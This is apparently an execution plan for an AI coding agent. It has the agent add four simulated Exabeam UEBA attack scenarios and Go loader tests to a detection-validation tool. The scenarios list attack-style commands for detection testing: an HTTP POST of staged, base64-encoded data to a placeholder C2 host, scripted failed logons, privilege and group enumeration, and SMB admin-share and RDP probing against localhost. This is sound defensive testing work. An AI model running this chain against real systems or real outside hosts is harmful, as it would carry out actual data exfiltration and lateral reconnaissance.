---
phase: 03-additional-techniques
plan: 02
type: execute
wave: 1
depends_on: []
files_modified:
  - internal/playbooks/embedded/techniques/UEBA_data_staging_exfil_chain.yaml
  - internal/playbooks/embedded/techniques/UEBA_account_takeover_chain.yaml
  - internal/playbooks/embedded/techniques/UEBA_privilege_escalation_chain.yaml
  - internal/playbooks/embedded/techniques/UEBA_lateral_movement_new_asset.yaml
  - internal/playbooks/loader_test.go
autonomous: true
requirements: [TECH-02, TECH-03]

must_haves:
  truths:
    - "4 new UEBA scenario YAML files exist and are parseable by the Go YAML loader"
    - "Each new UEBA scenario has non-empty expected_events with only queryable channels"
    - "Each UEBA scenario follows tactic: ueba-scenario pattern"
    - "Each UEBA scenario ends with UEBA DETECTION EXPECTED: output block"
    - "A TestExpectedEvents test asserts all loaded techniques have non-empty expected_events"
    - "All 52 techniques (43 existing + 9 new) pass expected_events validation"
  artifacts:
    - path: "internal/playbooks/embedded/techniques/UEBA_data_staging_exfil_chain.yaml"
      provides: "UEBA — Data Staging + Exfiltration Chain scenario"
      contains: "tactic: ueba-scenario"
    - path: "internal/playbooks/embedded/techniques/UEBA_account_takeover_chain.yaml"
      provides: "UEBA — Account Takeover Chain scenario"
      contains: "tactic: ueba-scenario"
    - path: "internal/playbooks/embedded/techniques/UEBA_privilege_escalation_chain.yaml"
      provides: "UEBA — Privilege Escalation Chain scenario"
      contains: "tactic: ueba-scenario"
    - path: "internal/playbooks/embedded/techniques/UEBA_lateral_movement_new_asset.yaml"
      provides: "UEBA — Lateral Movement + New Asset Chain scenario"
      contains: "tactic: ueba-scenario"
    - path: "internal/playbooks/loader_test.go"
      provides: "TestExpectedEvents — all techniques have expected_events"
      contains: "TestExpectedEvents"
  key_links:
    - from: "internal/playbooks/loader_test.go"
      to: "internal/playbooks/loader.go"
      via: "LoadEmbedded() call in test"
      pattern: "LoadEmbedded"
    - from: "internal/playbooks/loader.go"
      to: "internal/playbooks/embedded/techniques/*.yaml"
      via: "fs.WalkDir auto-discovery at build time"
      pattern: "WalkDir.*embedded/techniques"
---

<objective>
Create all 4 new Exabeam UEBA scenario YAML files and add a TestExpectedEvents test that validates TECH-03 (all techniques have expected_events populated).

Purpose: Satisfies TECH-02 (4 new UEBA scenarios, exceeding 3 minimum per D-04) and TECH-03 (machine-verifiable expected_events coverage). The test provides the automated Wave 0 verification identified in VALIDATION.md.
Output: 4 new UEBA YAML files + 1 new test file.
</objective>

<execution_context>
@$HOME/.claude/get-shit-done/workflows/execute-plan.md
@$HOME/.claude/get-shit-done/templates/summary.md
</execution_context>

<context>
@.planning/PROJECT.md
@.planning/ROADMAP.md
@.planning/STATE.md

@internal/playbooks/types.go
@internal/playbooks/loader.go
@internal/playbooks/embedded/techniques/UEBA_credential_spray_chain.yaml
@internal/playbooks/embedded/techniques/UEBA_offhours_activity.yaml
@internal/playbooks/embedded/techniques/UEBA_lateral_discovery_chain.yaml

<interfaces>
<!-- EventSpec and Technique structs from internal/playbooks/types.go -->
From internal/playbooks/types.go:
```go
type EventSpec struct {
    EventID     int    `yaml:"event_id"`
    Channel     string `yaml:"channel"`
    Description string `yaml:"description"`
    Contains    string `yaml:"contains,omitempty"`
}

type Technique struct {
    ID                string      `yaml:"id"`
    Name              string      `yaml:"name"`
    ExpectedEvents    []EventSpec `yaml:"expected_events"`
    // ... other fields
}
```

From internal/playbooks/loader.go:
```go
func LoadEmbedded() (*Registry, error)

type Registry struct {
    Techniques map[string]*Technique
    Campaigns  map[string]*Campaign
}
```

Only queryable channels allowed in expected_events:
- "Security"
- "Microsoft-Windows-PowerShell/Operational"
- "Microsoft-Windows-Sysmon/Operational"

UEBA YAML pattern (from existing files):
- tactic: ueba-scenario
- technique_id: <most representative ATT&CK ID>
- phase: attack
- tags must include: ueba, exabeam
- Command must end with "UEBA DETECTION EXPECTED:" Write-Host block
</interfaces>
</context>

<tasks>

<task type="auto">
  <name>Task 1: Create 4 UEBA scenario YAML files</name>
  <files>
    internal/playbooks/embedded/techniques/UEBA_data_staging_exfil_chain.yaml
    internal/playbooks/embedded/techniques/UEBA_account_takeover_chain.yaml
    internal/playbooks/embedded/techniques/UEBA_privilege_escalation_chain.yaml
    internal/playbooks/embedded/techniques/UEBA_lateral_movement_new_asset.yaml
  </files>
  <read_first>
    internal/playbooks/embedded/techniques/UEBA_credential_spray_chain.yaml
    internal/playbooks/embedded/techniques/UEBA_offhours_activity.yaml
    internal/playbooks/embedded/techniques/UEBA_lateral_discovery_chain.yaml
    internal/playbooks/types.go
    .planning/phases/03-additional-techniques/03-RESEARCH.md
  </read_first>
  <action>
Create 4 UEBA scenario YAML files following the exact pattern of existing UEBA files (per D-04, D-05). Each must end with a `UEBA DETECTION EXPECTED:` output block.

**UEBA_data_staging_exfil_chain.yaml** (D-04 scenario 1):
- id: UEBA-DATA-STAGING, name: "UEBA -- Data Staging + Exfiltration Chain"
- description: "Exabeam UEBA scenario: simulates attacker staging sensitive files into a collection directory then attempting HTTP exfiltration. Triggers Exabeam data exfiltration and abnormal data movement use cases."
- tactic: ueba-scenario, technique_id: T1074, platform: windows, phase: attack, elevation_required: false
- tags: [ueba, exabeam, data-exfiltration, collection]
- expected_events:
  - event_id: 4104, channel: "Microsoft-Windows-PowerShell/Operational", description: "PowerShell ScriptBlock — file staging loop collecting data to temp directory"
  - event_id: 11, channel: "Microsoft-Windows-Sysmon/Operational", description: "Sysmon FileCreate — staged files written to collection directory"
  - event_id: 3, channel: "Microsoft-Windows-Sysmon/Operational", description: "Sysmon NetworkConnect — HTTP POST exfiltration attempt to C2"
- Command behavioral chain:
  1. Create 5 synthetic "sensitive" files in `$env:TEMP\lnj_stage\` (each ~1KB with fake data)
  2. Use `Get-ChildItem` loop to enumerate and "collect" file metadata into an array (automated staging)
  3. Base64-encode collected file list: `$encoded = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($fileList))`
  4. HTTP POST exfil attempt: `try { Invoke-WebRequest -Uri "http://lognojutsu-c2.invalid/exfil" -Method POST -Body $encoded -TimeoutSec 3 } catch { ... }`
  5. End with UEBA DETECTION EXPECTED block: "Data exfiltration — large volume staging + outbound connection"
- cleanup: |-
    Remove-Item "$env:TEMP\lnj_stage" -Recurse -Force -ErrorAction Ignore
    Write-Host "Cleanup: Staging artifacts removed."

**UEBA_account_takeover_chain.yaml** (D-04 scenario 2):
- id: UEBA-ACCOUNT-TAKEOVER, name: "UEBA -- Account Takeover Chain"
- description: "Exabeam UEBA scenario: generates failed logon attempts followed by post-authentication enumeration at unusual hours. Triggers Exabeam account compromise chain and abnormal authentication pattern use cases."
- tactic: ueba-scenario, technique_id: T1078, platform: windows, phase: attack, elevation_required: false
- tags: [ueba, exabeam, account-compromise, brute-force]
- expected_events:
  - event_id: 4625, channel: "Security", description: "Failed logon x5 — rapid succession (Exabeam: brute force precursor)"
  - event_id: 4624, channel: "Security", description: "Logon event — existing session (Exabeam: new session after failures)"
  - event_id: 4688, channel: "Security", description: "Post-auth enumeration burst — whoami, ipconfig, net user (Exabeam: recon after compromise)"
- Command behavioral chain:
  1. Generate 5 failed auth: `Add-Type -AssemblyName System.DirectoryServices.AccountManagement` then loop `$ctx.ValidateCredentials("takeover_test_user", "WrongPass$i!")` x5 with 200ms delay
  2. Log current time/hour, note if outside business hours
  3. Post-auth recon burst: `whoami /all`, `ipconfig /all`, `net user`, `net localgroup administrators` — rapid enumeration (EID 4688 burst)
  4. End with UEBA DETECTION EXPECTED block: "Account compromise — failed logins + success + enumeration burst"
- cleanup: ""

**UEBA_privilege_escalation_chain.yaml** (D-04 scenario 3):
- id: UEBA-PRIV-ESC, name: "UEBA -- Privilege Escalation Chain"
- description: "Exabeam UEBA scenario: simulates a normal user checking privileges, enumerating admin groups, and attempting privilege-related operations. Triggers Exabeam abnormal privilege use and privilege escalation attempt use cases."
- tactic: ueba-scenario, technique_id: T1134.001, platform: windows, phase: attack, elevation_required: false
- tags: [ueba, exabeam, privilege-escalation]
- expected_events:
  - event_id: 4688, channel: "Security", description: "whoami.exe /priv — privilege enumeration (Exabeam: abnormal admin tool use)", contains: "/priv"
  - event_id: 4688, channel: "Security", description: "net.exe localgroup administrators — admin group check"
  - event_id: 4104, channel: "Microsoft-Windows-PowerShell/Operational", description: "PowerShell ScriptBlock — WindowsIdentity privilege check via .NET API"
  - event_id: 4672, channel: "Security", description: "Special privileges assigned to new logon (if elevated)"
- Command behavioral chain:
  1. `whoami /priv` — enumerate current privileges (EID 4688)
  2. `whoami /groups` — check group memberships
  3. `net localgroup administrators` — enumerate admin group (EID 4688)
  4. `[System.Security.Principal.WindowsIdentity]::GetCurrent().Groups | ...` — .NET API privilege check (EID 4104)
  5. Output whether current user has admin token
  6. End with UEBA DETECTION EXPECTED block: "Abnormal privilege use — normal user running admin tools and token checks"
- cleanup: ""

**UEBA_lateral_movement_new_asset.yaml** (D-04 scenario 4):
- id: UEBA-LATERAL-NEW-ASSET, name: "UEBA -- Lateral Movement + New Asset Access"
- description: "Exabeam UEBA scenario: simulates first-time access to a new internal host via SMB share enumeration and RDP port probing. Triggers Exabeam new asset access and lateral movement use cases."
- tactic: ueba-scenario, technique_id: T1021.002, platform: windows, phase: attack, elevation_required: false
- tags: [ueba, exabeam, lateral-movement]
- expected_events:
  - event_id: 5140, channel: "Security", description: "Network share object accessed — SMB share access attempt (Exabeam: new asset access)"
  - event_id: 4688, channel: "Security", description: "net.exe use/view — share enumeration on target host"
  - event_id: 3, channel: "Microsoft-Windows-Sysmon/Operational", description: "Sysmon NetworkConnect — port 445 SMB connection attempt"
  - event_id: 4624, channel: "Security", description: "Logon event — network logon type 3 if share access succeeds"
- Command behavioral chain:
  1. `net use \\127.0.0.1\C$ 2>&1 | Write-Host` — SMB admin share access attempt (EID 5140 + Sysmon EID 3)
  2. `net view \\127.0.0.1 2>&1 | Write-Host` — enumerate shares on "remote" host (EID 4688)
  3. `net session 2>&1 | Write-Host` — check active sessions
  4. `Test-NetConnection -ComputerName 127.0.0.1 -Port 445 -InformationLevel Quiet` — SMB port probe (Sysmon EID 3)
  5. `Test-NetConnection -ComputerName 127.0.0.1 -Port 3389 -InformationLevel Quiet` — RDP port probe (Sysmon EID 3)
  6. End with UEBA DETECTION EXPECTED block: "First-time access to new asset + lateral movement via SMB/RDP"
- cleanup: 'net use \\127.0.0.1\C$ /delete 2>$null; Write-Host "Cleanup: SMB connection removed."'

Distinction from existing UEBA-LATERAL-CHAIN: The existing scenario covers recon enumeration speed (12 commands in burst). This new scenario focuses on network-based first-time asset access (SMB + RDP probing), a distinct Exabeam use case family.
  </action>
  <verify>
    <automated>go build ./internal/playbooks/... 2>&1</automated>
  </verify>
  <acceptance_criteria>
    - File UEBA_data_staging_exfil_chain.yaml exists and contains `id: UEBA-DATA-STAGING`
    - File UEBA_data_staging_exfil_chain.yaml contains `tactic: ueba-scenario`
    - File UEBA_data_staging_exfil_chain.yaml contains `lognojutsu-c2.invalid`
    - File UEBA_account_takeover_chain.yaml exists and contains `id: UEBA-ACCOUNT-TAKEOVER`
    - File UEBA_account_takeover_chain.yaml contains `tactic: ueba-scenario`
    - File UEBA_account_takeover_chain.yaml contains `ValidateCredentials`
    - File UEBA_privilege_escalation_chain.yaml exists and contains `id: UEBA-PRIV-ESC`
    - File UEBA_privilege_escalation_chain.yaml contains `tactic: ueba-scenario`
    - File UEBA_privilege_escalation_chain.yaml contains `WindowsIdentity`
    - File UEBA_lateral_movement_new_asset.yaml exists and contains `id: UEBA-LATERAL-NEW-ASSET`
    - File UEBA_lateral_movement_new_asset.yaml contains `tactic: ueba-scenario`
    - File UEBA_lateral_movement_new_asset.yaml contains `Test-NetConnection`
    - All 4 files contain `UEBA DETECTION EXPECTED:` in their command blocks
    - All 4 files contain tags including `ueba` and `exabeam`
    - All 4 files contain `expected_events:` with at least 2 entries each
    - All 4 files use only queryable channels
    - `go build ./internal/playbooks/...` exits 0
  </acceptance_criteria>
  <done>4 UEBA scenario YAML files created matching existing UEBA pattern, each with distinct Exabeam use case coverage, expected_events populated, UEBA DETECTION EXPECTED blocks present. Build succeeds.</done>
</task>

<task type="auto" tdd="true">
  <name>Task 2: Add TestExpectedEvents and TestNewTechniqueCount loader tests</name>
  <files>
    internal/playbooks/loader_test.go
  </files>
  <read_first>
    internal/playbooks/loader.go
    internal/playbooks/types.go
    internal/playbooks/types_test.go
  </read_first>
  <behavior>
    - TestExpectedEvents: LoadEmbedded() succeeds, iterate all registry.Techniques, assert len(t.ExpectedEvents) > 0 for every technique. Fails if any technique has empty expected_events.
    - TestNewTechniqueCount: LoadEmbedded() succeeds, registry.Techniques has at least 48 entries (43 existing + 5 new ATT&CK). Specifically check that keys "T1005", "T1560.001", "T1119", "T1071.001", "T1071.004" exist.
    - TestNewUEBACount: LoadEmbedded() succeeds, count techniques where Tactic == "ueba-scenario", assert at least 7 (3 existing + 4 new). Specifically check keys "UEBA-DATA-STAGING", "UEBA-ACCOUNT-TAKEOVER", "UEBA-PRIV-ESC", "UEBA-LATERAL-NEW-ASSET" exist.
  </behavior>
  <action>
Create `internal/playbooks/loader_test.go` with 3 test functions in `package playbooks` (white-box, same pattern as types_test.go):

```go
package playbooks

import "testing"

func TestExpectedEvents(t *testing.T) {
    reg, err := LoadEmbedded()
    if err != nil {
        t.Fatalf("LoadEmbedded() failed: %v", err)
    }
    for id, tech := range reg.Techniques {
        if len(tech.ExpectedEvents) == 0 {
            t.Errorf("technique %q (%s) has no expected_events", id, tech.Name)
        }
    }
}

func TestNewTechniqueCount(t *testing.T) {
    reg, err := LoadEmbedded()
    if err != nil {
        t.Fatalf("LoadEmbedded() failed: %v", err)
    }
    if len(reg.Techniques) < 48 {
        t.Errorf("expected at least 48 techniques, got %d", len(reg.Techniques))
    }
    required := []string{"T1005", "T1560.001", "T1119", "T1071.001", "T1071.004"}
    for _, id := range required {
        if _, ok := reg.Techniques[id]; !ok {
            t.Errorf("missing required new ATT&CK technique: %s", id)
        }
    }
}

func TestNewUEBACount(t *testing.T) {
    reg, err := LoadEmbedded()
    if err != nil {
        t.Fatalf("LoadEmbedded() failed: %v", err)
    }
    uebaCount := 0
    for _, tech := range reg.Techniques {
        if tech.Tactic == "ueba-scenario" {
            uebaCount++
        }
    }
    if uebaCount < 7 {
        t.Errorf("expected at least 7 UEBA scenarios, got %d", uebaCount)
    }
    required := []string{"UEBA-DATA-STAGING", "UEBA-ACCOUNT-TAKEOVER", "UEBA-PRIV-ESC", "UEBA-LATERAL-NEW-ASSET"}
    for _, id := range required {
        if _, ok := reg.Techniques[id]; !ok {
            t.Errorf("missing required new UEBA scenario: %s", id)
        }
    }
}
```

This test file provides:
- TECH-03 machine verification: TestExpectedEvents asserts ALL techniques have non-empty expected_events
- TECH-01 count verification: TestNewTechniqueCount confirms 5 new ATT&CK techniques loaded
- TECH-02 count verification: TestNewUEBACount confirms 4 new UEBA scenarios loaded

Note: This test will only pass after Plan 01's YAML files are also present (both plans are Wave 1 parallel, but the test runs against the combined result). The test should be committed and will pass once all 9 YAML files exist at wave-end verification.
  </action>
  <verify>
    <automated>go test ./internal/playbooks/... -run "TestExpectedEvents|TestNewTechniqueCount|TestNewUEBACount" -count=1 -v 2>&1</automated>
  </verify>
  <acceptance_criteria>
    - File internal/playbooks/loader_test.go exists
    - File contains `func TestExpectedEvents(t *testing.T)`
    - File contains `func TestNewTechniqueCount(t *testing.T)`
    - File contains `func TestNewUEBACount(t *testing.T)`
    - File contains `LoadEmbedded()` call
    - File contains `package playbooks` (white-box test)
    - File contains check for `len(tech.ExpectedEvents) == 0`
    - File contains check for at least 48 techniques
    - File contains check for at least 7 UEBA scenarios
    - `go test ./internal/playbooks/... -run TestExpectedEvents -count=1` exits 0
    - `go test ./internal/playbooks/... -run TestNewTechniqueCount -count=1` exits 0
    - `go test ./internal/playbooks/... -run TestNewUEBACount -count=1` exits 0
  </acceptance_criteria>
  <done>loader_test.go created with 3 tests validating TECH-01 (5 new ATT&CK), TECH-02 (4 new UEBA), and TECH-03 (all techniques have expected_events). All tests pass.</done>
</task>

</tasks>

<verification>
- `go test ./internal/playbooks/... -count=1 -v` passes all tests (types + loader)
- `go test ./... -count=1` full suite passes
- 4 new UEBA YAML files exist in internal/playbooks/embedded/techniques/
- loader_test.go exists with TestExpectedEvents, TestNewTechniqueCount, TestNewUEBACount
- grep confirms all UEBA files have `tactic: ueba-scenario` and `UEBA DETECTION EXPECTED:`
</verification>

<success_criteria>
- 4 new Exabeam UEBA scenario YAML files created and loadable
- Each covers a distinct Exabeam use case (data exfil, account takeover, priv esc, lateral movement)
- TestExpectedEvents validates TECH-03 across all 52 techniques
- TestNewTechniqueCount validates TECH-01 (5 new ATT&CK IDs present)
- TestNewUEBACount validates TECH-02 (7+ UEBA scenarios, 4 new IDs present)
- All tests pass
</success_criteria>

<output>
After completion, create `.planning/phases/03-additional-techniques/03-02-SUMMARY.md`
</output>
